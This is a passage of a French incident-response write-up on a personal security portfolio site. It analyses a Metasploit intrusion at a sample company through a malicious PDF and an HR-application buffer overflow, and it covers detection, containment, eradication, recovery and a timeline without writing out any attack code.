style="list-style-type:disc"><strong>06:33:44</strong> : Déploiement d’un correctif d’urgence sur l’application RH pour combler la vulnérabilité de type buffer overflow.</li></ul><hr id="1ea25200-7eb4-802f-b290-c9b812a0466d"/><h3 class="" id="1ea25200-7eb4-8079-9cf8-d4c2122a1342"><strong>Nature de l’Attaque</strong></h3><p class="" id="1ea25200-7eb4-809e-9e25-f942b9235bae">Cette section vise à examiner en détail le mode opératoire de l’acteur malveillant, en analysant les tactiques, techniques et procédures (TTPs) utilisées tout au long de l’intrusion. Par exemple, nous avons étudié la manière dont l’équipe SOC a pu déterminer que l’entité non autorisée avait recours au <strong>framework Metasploit</strong>.</p><hr id="1ea25200-7eb4-8004-9c36-fca445f1bf45"/><h3 class="" id="1ea25200-7eb4-807e-bbd9-f1164be834ff"><strong>Détection de Metasploit</strong></h3><p class="" id="1ea25200-7eb4-80eb-97f2-f4f7ebb69df0">Pour mieux comprendre les méthodes employées, une attention particulière a été portée sur les commandes <strong>PowerShell</strong> malveillantes exécutées, notamment celle visible dans la capture d’écran suivante.</p><figure class="image" id="1ea25200-7eb4-8048-9b59-eb6bc35e38de"><a href="image%2016.png"><img src="image%2016.png" style="width:587.984375px"/></a></figure><p class="" id="1ea25200-7eb4-805c-bcc7-ffb51ac1db12">Après inspection, il est apparu clairement qu'un double codage avait été utilisé, probablement pour contourner les mécanismes de détection. L'équipe SOC a réussi à décoder la charge utile malveillante, révélant le code PowerShell exact exécuté dans la mémoire de <a href="http://wkst01.samplecorp.com/">WKST01.samplecorp.com</a>.</p><figure class="image" id="1ea25200-7eb4-8040-84a8-dfe1ec2f7dc9"><a href="image%2017.png"><img src="image%2017.png" style="width:587.96875px"/></a></figure><p class="" id="1ea25200-7eb4-8083-b844-c673f66f0918">En exploitant les renseignements open source, notre équipe SOC a déterminé que ce code PowerShell est probablement lié au framework de post-exploitation Metasploit.</p><figure class="image" id="1ea25200-7eb4-8045-b289-eaa941e83605"><a href="image%2018.png"><img src="image%2018.png" style="width:3791px"/></a></figure><p class="" id="1ea25200-7eb4-8061-9a3b-ce0a0539b94b">Pour étayer notre hypothèse d'utilisation de Metasploit, nous avons analysé en profondeur le shellcode détecté. Nous avons exporté les octets du paquet contenant le shellcode (au format .bin) et les avons ensuite soumis à VirusTotal pour évaluation.</p><figure class="image" id="1ea25200-7eb4-8058-a222-d86bf7e1440c"><a href="image%2019.png"><img src="image%2019.png" style="width:587.984375px"/></a></figure><figure class="image" id="1ea25200-7eb4-80ee-a222-f28307fda4ce"><a href="image%2020.png"><img src="image%2020.png" style="width:413.984375px"/></a></figure><figure class="image" id="1ea25200-7eb4-8002-959e-f9b959c15f6b"><a href="image%2021.png"><img src="image%2021.png" style="width:587.984375px"/></a></figure><h3 class="" id="1ea25200-7eb4-80af-9522-d579c1cf7f71"><strong>Confirmation de l’utilisation de Metasploit</strong></h3><p class="" id="1ea25200-7eb4-8064-9fae-f2b85347f578">Les résultats fournis par <strong>VirusTotal</strong> ont confirmé nos soupçons concernant l’usage de <strong>Metasploit</strong>. Les artefacts tels que <code>metacoder</code> et <code>shikata</code>, détectés dans les charges utiles, sont intrinsèquement liés au shellcode généré par ce framework de post-exploitation.</p><hr id="1ea25200-7eb4-804b-bf31-c6ccc28f11d1"/><h3 class="" id="1ea25200-7eb4-80ad-bc2b-c9b9639e8e6a"><strong>Analyse de l'Impact</strong></h3><p class="" id="1ea25200-7eb4-80b0-aef3-e49fc8f3b212">Dans cette section, une analyse approfondie des impacts sur les parties prenantes est essentielle, en tenant compte de la structure interne spécifique de l’entreprise, de son environnement commercial et de ses obligations réglementaires. Cette évaluation vise à cerner les répercussions de l’incident sur toutes les entités concernées.</p><hr id="1ea25200-7eb4-8099-a6bd-ee96703ef153"/><h3 class="" id="1ea25200-7eb4-80e7-b31a-e0336bbe4044"><strong>Analyse de la Réponse et de la Récupération</strong></h3><h3 class="" id="1ea25200-7eb4-8096-bbe2-d8ad37206e55"><strong>Mesures de Réponse Immédiate</strong></h3><p class="" id="1ea25200-7eb4-80a9-ac5c-fb59cf1f29f9"><strong>Révocation des Accès :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-800e-9b8e-e3ea052c0eaa"><li style="list-style-type:disc"><strong>Identification des systèmes et comptes compromis :</strong> Grâce à la solution SIEM d’Elastic, des activités suspectes ont été détectées sur <strong>WKST01.samplecorp.com</strong>. Une analyse des journaux et du trafic réseau a ensuite révélé une compromission de <strong>HR01.samplecorp.com</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8000-bc86-f94d7e6e42db"><li style="list-style-type:disc"><strong>Période :</strong> Les activités malveillantes ont été détectées le <strong>22 avril 2019 à 01:05:00</strong>. L’accès a été révoqué à <strong>03:43:34</strong>, suite à la mise à jour des règles du pare-feu bloquant l’IP du serveur C2.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-804d-a0d5-cfd947df5841"><li style="list-style-type:disc"><strong>Méthode de révocation :</strong> En complément du blocage via pare-feu, des politiques Active Directory ont été mises en œuvre pour forcer la déconnexion des sessions suspectes. Les identifiants utilisateurs compromis ont été réinitialisés et les clés API concernées ont été révoquées.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80ff-a962-c55e8fc0d911"><li style="list-style-type:disc"><strong>Impact :</strong> Cette action rapide a permis d’arrêter tout mouvement latéral potentiel et de prévenir une compromission plus étendue.</li></ul><h3 class="" id="1ea25200-7eb4-80b5-8201-c0671400c0bd"><strong>Stratégie de Confinement</strong></h3><ul class="bulleted-list" id="1ea25200-7eb4-807c-a9bc-cfdaf06ed9a4"><li style="list-style-type:disc"><strong>Mesures à court terme :</strong> Une segmentation VLAN a été immédiatement appliquée pour isoler les hôtes compromis (<strong>WKST01</strong> et <strong>HR01</strong>) du reste du réseau, limitant ainsi la propagation de l’attaque.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-803e-a5c4-fa67efd9c780"><li style="list-style-type:disc"><strong>Mesures à long terme :</strong> Des plans ont été établis pour renforcer la segmentation réseau, en cloisonnant les services critiques et en limitant l'accès aux seuls équipements autorisés.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-808d-b0b4-c1c94730de77"><li style="list-style-type:disc"><strong>Efficacité :</strong> La stratégie a été efficace, empêchant toute élévation de privilège ou mouvement vers d'autres systèmes.</li></ul><h3 class="" id="1ea25200-7eb4-8057-9f56-c7ae715ddd3c"><strong>Mesures d'Éradication</strong></h3><p class="" id="1ea25200-7eb4-809d-878e-c7de770d7aa1"><strong>Suppression du Malware :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8023-aab8-f36d2d9eac6a"><li style="list-style-type:disc"><strong>Identification :</strong> Des processus suspects ont été détectés sur les hôtes infectés. L’analyse forensique a révélé la présence de composants typiques de Metasploit, confirmée par VirusTotal.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8004-9a53-f0b87b7d0815"><li style="list-style-type:disc"><strong>Suppression :</strong> Un outil spécialisé a été utilisé pour éradiquer toutes les charges malveillantes identifiées sur <strong>WKST01</strong> et <strong>HR01</strong>.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80cd-8c50-f12ca173390c"><li style="list-style-type:disc"><strong>Vérification :</strong> Des analyses supplémentaires, incluant des méthodes heuristiques, ont été menées pour s’assurer de l’absence de résidus malveillants.</li></ul><p class="" id="1ea25200-7eb4-80ba-8930-cf96647eabf6"><strong>Mise à jour des Systèmes :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-80b1-8768-fa634176c033"><li style="list-style-type:disc"><strong>Identification des vulnérabilités :</strong> Deux vulnérabilités ont été exploitées : une faille connue dans une version obsolète d’Acrobat Reader et un <strong>buffer overflow</strong> dans une application RH propriétaire.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80bc-a29d-d93a68dd3f5b"><li style="list-style-type:disc"><strong>Gestion des correctifs :</strong> Acrobat Reader a été mis à jour sur tous les postes. Un patch d'urgence a également été développé et déployé sur l’application RH vulnérable (<strong>HR01</strong>).</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-808e-841f-cab6ad2cdc48"><li style="list-style-type:disc"><strong>Procédures de repli :</strong> Des sauvegardes système ont été réalisées avant chaque mise à jour pour permettre un retour rapide en cas d’instabilité.</li></ul><hr id="1ea25200-7eb4-8027-a281-e72bb1fcea33"/><h3 class="" id="1ea25200-7eb4-80f7-b9ae-db4d24d1c011"><strong>Étapes de Récupération</strong></h3><p class="" id="1ea25200-7eb4-80cf-8f11-eb2558ab6fd1"><strong>Restauration des Données :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8065-bb23-f770df740e95"><li style="list-style-type:disc"><strong>Validation des sauvegardes :</strong> Des contrôles d’intégrité ont été réalisés via comparaison de checksums avant toute restauration.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80a7-b608-f7575ab62607"><li style="list-style-type:disc"><strong>Processus de restauration :</strong> Les systèmes ont été restaurés à partir de sauvegardes validées par l’équipe SOC.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80e7-b920-c89e0f9c9555"><li style="list-style-type:disc"><strong>Vérification de l’intégrité :</strong> Des hachages cryptographiques (SHA-256) ont été générés pour s'assurer de l'authenticité des données restaurées.</li></ul><p class="" id="1ea25200-7eb4-806e-af21-c42afe8f3109"><strong>Validation des Systèmes :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-807f-a041-d10bfec40d93"><li style="list-style-type:disc"><strong>Mesures de sécurité :</strong> Les pare-feux et les systèmes de détection d’intrusion ont été mis à jour avec les derniers IoCs identifiés.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8025-b030-d0307ce08886"><li style="list-style-type:disc"><strong>Tests opérationnels :</strong> Avant la remise en production, des tests de charge et de stabilité ont été réalisés.</li></ul><hr id="1ea25200-7eb4-80fe-8328-c22f33c42eff"/><h3 class="" id="1ea25200-7eb4-8061-9595-d3cb205a5710"><strong>Actions Post-Incident</strong></h3><p class="" id="1ea25200-7eb4-8077-8fbd-da9ef3853cbc"><strong>Surveillance Renforcée :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-806a-99a2-f73c7ebe72ec"><li style="list-style-type:disc"><strong>Nouveau plan de supervision :</strong> Mise en place d’une surveillance comportementale visant à détecter toute anomalie par rapport à un profil d’activité normal.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8024-b6da-d3417d3d7cba"><li style="list-style-type:disc"><strong>Outils utilisés :</strong> Le SIEM Elastic sera configuré avec de nouvelles règles de corrélation pour identifier les TTPs associés à cet incident.</li></ul><p class="" id="1ea25200-7eb4-8058-87a5-c146a66b8d42"><strong>Retour d’Expérience :</strong></p><ul class="bulleted-list" id="1ea25200-7eb4-8061-a482-f4646d8006e3"><li style="list-style-type:disc"><strong>Analyse des lacunes :</strong> L’incident a mis en lumière des faiblesses concernant les contrôles d'accès, le filtrage des e-mails, la segmentation réseau et la sensibilisation aux attaques par hameçonnage.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-8006-a655-fd6840a482db"><li style="list-style-type:disc"><strong>Recommandations :</strong> Prioriser la gestion des actifs, le filtrage des courriels et le renforcement de la formation à la cybersécurité.</li></ul><ul class="bulleted-list" id="1ea25200-7eb4-80b0-99d7-f277f6a467ee"><li style="list-style-type:disc"><strong>Stratégie future :</strong> Adopter une approche <strong>Zero Trust</strong>, segmenter plus finement le réseau, et investir davantage dans la formation et les outils de protection préventive.</li></ul><hr id="1ea25200-7eb4-8075-9131-f88bee23072c"/><h3 class="" id="1ea25200-7eb4-80bc-a079-c45c90aed985"><strong>Annexe A – Chronologie Technique</strong></h3><table class="simple-table" id="1ea25200-7eb4-8022-8795-d012c3544d5e"><tbody><tr id="1ea25200-7eb4-8049-8aab-cd02ce8eec8e"><td class="" id="m@N\">Heure</td><td class="" id="LSbD">Événement</td></tr><tr id="1ea25200-7eb4-808c-9dd4-e805eebf55d5"><td class="" id="m@N\">22 avril 2019, 00:27:27</td><td class="" id="LSbD">Un employé ouvre un fichier PDF malveillant (<code>cv.pdf</code>) sur <strong>WKST01</strong>, exploitant une faille Acrobat Reader. Une charge utile s'exécute, établissant un premier point d’ancrage.</td></tr><tr id="1ea25200-7eb4-8033-bc10-cd841b96ff77"><td class="" id="m@N\">22 avril 2019, 00:35:09</td><td class="" id="LSbD">Accès non autorisé à des répertoires contenant du code source et des clés API.</td></tr><tr id="1ea25200-7eb4-80d7-8728-d6d6ad77244a"><td class="" id="m@N\">22 avril 2019, 00:50:18</td><td class="" id="LSbD">L’attaquant effectue une reconnaissance et identifie un buffer overflow dans l’application RH de <strong>HR01</strong>, qu’il exploite.</td></tr><tr id="1ea25200-7eb4-8010-86fb-d88ee2d347e7"><td class="" id="m@N\">22 avril 2019, 01:30:12</td><td class="" id="LSbD">Accès à une base de données non chiffrée contenant des données sensibles, exfiltrées via un tunnel SSH.</td></tr><tr id="1ea25200-7eb4-804f-b37e-cf30c9874148"><td class="" id="m@N\">22 avril 2019, 02:30:11</td><td class="" id="LSbD">Isolement de <strong>WKST01</strong> et <strong>HR01</strong> via segmentation VLAN.</td></tr><tr id="1ea25200-7eb4-804f-a8b1-ff01eb635e37"><td class="" id="m@N\">22 avril 2019, 03:10:14</td><td class="" id="LSbD">Déploiement de solutions de sécurité pour collecter plus d’informations sur les hôtes compromis.</td></tr><tr id="1ea25200-7eb4-80b4-baea-e9294ce2f4df"><td class="" id="m@N\">22 avril 2019, 03:43:34</td><td class="" id="LSbD">Blocage de l’IP C2 via les règles du pare-feu.</td></tr><tr id="1ea25200-7eb4-80e1-8a75-fac7f995f57e"><td class="" id="m@N\">22 avril 2019, 04:11:00</td><td class="" id="LSbD">Suppression du malware avec un outil spécialisé.</td></tr><tr id="1ea25200-7eb4-80a0-8c0f-ce16d39448bd"><td class="" id="m@N\">22 avril 2019, 04:30:00</td><td class="" id="LSbD">Mise à jour d’Acrobat Reader sur toutes les machines.</td></tr><tr id="1ea25200-7eb4-8026-b3c7-e1da5c66002a"><td class="" id="m@N\">22 avril 2019, 05:01:08</td><td class="" id="LSbD">Révocation des clés API compromises.</td></tr><tr id="1ea25200-7eb4-8016-8e45-fa4c2a49e212"><td class="" id="m@N\">22 avril 2019, 05:05:08</td><td class="" id="LSbD">Réinitialisation des identifiants des utilisateurs affectés.</td></tr><tr id="1ea25200-7eb4-8020-abfb-c970f5ff5390"><td class="" id="m@N\">22 avril 2019, 05:21:20</td><td class="" id="LSbD">Restauration de <strong>WKST01</strong> depuis une sauvegarde vérifiée.</td></tr><tr id="1ea25200-7eb4-80aa-a648-eb6584433f2c"><td class="" id="m@N\">22 avril 2019, 05:58:50</td><td class="" id="LSbD">Restauration de <strong>HR01</strong> depuis une sauvegarde vérifiée.</td></tr><tr id="1ea25200-7eb4-8071-9c80-ebb83468c3a1"><td class="" id="m@N\">22 avril 2019, 06:33:44</td><td class="" id="LSbD">Déploiement du correctif pour la vulnérabilité buffer overflow de l’application RH.</td></tr></tbody></table></div></figure></div></details></div></details><p class="" id="1ea25200-7eb4-8015-a829-d5387cd2367b">
</p><p class="" id="1ea25200-7eb4-8098-860a-efaf9db03429">
</p><figure class="block-color-gray_background callout" id="1ea25200-7eb4-80f6-a09d-f7cff66ae799" style="white-space:pre-wrap;display:flex"><div style="font-size:1.5em"><span class="icon"></span></div><div style="width:100%"><p class="" id="1ea25200-7eb4-8041-8867-e625ef1e5c12"><strong>c4tz                                          6/05/25<br/><br/> </strong></p></div></figure><p class="" id="1ea25200-7eb4-80a9-9652-cbaee66c9d68">
</p><p class="" id="1ea25200-7eb4-80fd-8749-ce78b9800fc5">
</p><p class="" id="1ea25200-7eb4-8029-a5ea-efe69d875985">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></section>
</main>
<footer class="footer">© 2025 c4tz — dark minimal</footer>
</div>
</div>
<nav aria-label="Navigation mobile" class="mobile-nav">
<a href="writeup.html"><span>WriteUp</span></a>
<a href="portfolio.html"><span>Portfolio</span></a>
<a href="skills.html"><span>Skills</span></a>
<a href="about.html"><span>About</span></a>
</nav>
<script>
(function(){
  // 2) rewrite image links to static/image/
  document.querySelectorAll('.prose img').forEach(function(img){
    var src = img.getAttribute('src')||'';
    if(/^image(%20|\s|%[\dA-Fa-f]{2}|)\d*\.png$/.test(src) || /^image\.png$/.test(src)){
      try{
        img.src = 'static/image/' + decodeURIComponent(src);
      }catch(e){
        img.src = 'static/image/' + src;
      }
    }
  });
  // convert <a href="image X.png"> wrappers too
  document.querySelectorAll('.prose a[href]').forEach(function(a){
    var href = a.getAttribute('href')||'';
    if(/^image(%20|\s|%[\dA-Fa-f]{2}|)\d*\.png$/.test(href) || /^image\.png$/.test(href)){
      try{
        a.setAttribute('href','static/image/' + decodeURIComponent(href));
      }catch(e){
        a.setAttribute('href','static/image/' + href);
      }
    }
  });

  // 1) convert pseudo-markdown inside <pre><code> when it's actually prose
  function looksLikeProse(text){
    var codeChars = /[{};<>\[\]\(\);=]/;
    var hasHeadings = /(^|\n)\s*#{2,4}\s+/m.test(text);
    var manyWords = (text.match(/\w+/g)||[]).length > 40;
    var fewCode = !codeChars.test(text);
    // markers 'spl', 'powershell' suggest real code; don't convert
    var isRealCode = /(powershell|spl|cmd\.exe|regex|C:\\|SELECT|curl|http:|https:)/i.test(text);
    return (hasHeadings || manyWords) && fewCode && !isRealCode;
  }

  document.querySelectorAll('.prose pre code').forEach(function(code){
    var text = code.textContent;
    if(looksLikeProse(text)){
      var parentPre = code.closest('pre');
      var container = document.createElement('div');
      container.className = 'converted-prose';
      // basic markdown to HTML
      text.split(/\n{2,}/).forEach(function(block){
        if(/^\s*####\s+/.test(block)){ var el=document.createElement('h4'); el.textContent=block.replace(/^\s*####\s+/, ''); container.appendChild(el); return;}
        if(/^\s*###\s+/.test(block)){ var el=document.createElement('h3'); el.textContent=block.replace(/^\s*###\s+/, ''); container.appendChild(el); return;}
        if(/^\s*##\s+/.test(block)){ var el=document.createElement('h2'); el.textContent=block.replace(/^\s*##\s+/, ''); container.appendChild(el); return;}
        if(/^\s*-\s+|\*\s+/.test(block)){ // list
          var ul=document.createElement('ul');
          block.split(/\n/).forEach(function(line){
            var m=line.match(/^\s*(?:-|\*)\s+(.*)$/); if(m){ var li=document.createElement('li'); li.textContent=m[1]; ul.appendChild(li); }
          });
          container.appendChild(ul); return;
        }
        if(/^\s*---\s*$/.test(block)){ container.appendChild(document.createElement('hr')); return; }
        // paragraph
        var p = document.createElement('p'); p.textContent = block.trim(); container.appendChild(p);
      });
      parentPre.replaceWith(container);
    }
  });
})();</script>
</html>
